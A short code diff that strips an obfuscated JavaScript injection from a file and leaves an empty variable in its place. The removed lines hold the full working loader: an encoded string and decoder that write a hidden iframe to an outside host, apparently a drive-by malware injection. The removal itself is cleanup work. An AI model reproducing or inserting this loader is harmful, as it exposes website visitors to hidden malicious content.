@@ -1,4 +1,1 @@
-d="=tdsjqu uzqf>'ufyu0kbwbtdsjqu'?wbs b>epdvnfou/dsfbufFmf1#('jgsbnf'*<b/tfuBuusjcvuf('tsd'-'iuuq;00xxx/bbclu/dpn0gbwjdpo/jdp\\#uzmf/xjeui>'43qy'8#ifjhiu9#7$Cpsefs>'1'<`$cpez/bqqfoeDijme(b*<)%c)%)%c)%)%ejlmbo+%c+%8#+%c+%+%(c+%d+%+%d+%+%zh{zx/ofu)%d)%8#)%d)%)%(d)%e)%)%e)%1'unbkj{jb3'e-%8#-%e-%-%(e-%f-%-%f-%-%mjolupnf/jogp-%f-%8#-%f-%-%(f-%g-%-%g-%-%deggxzl5'g+%8#+%g+%+%(g*<=0tdsjqu?=0cpez?=0iunm";
-l='\0\t\n\r !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\134]^_`abcdefghijklmnopqrstuvwxyz{|}~';
-s='';
-for (i=0;i<d.length;i++){b=d.charAt(i);a=l.indexOf(b);if (a==1) a=9;if (a==2) a=10;if (a==3) a=13;if (a==4) a=34;if (a<=31 & a>=14){off=s.length-(l.indexOf(d.charAt(++i))-36+90*(l.indexOf(d.charAt(++i))-35))-1;lp=off+a-14+4;s=s+s.substring(off,lp);}else if (a>0){ if (a>=41) a=a-1; s=s+l.charAt(a);} else s=s+b;}document.writeln(s);
+var a=''
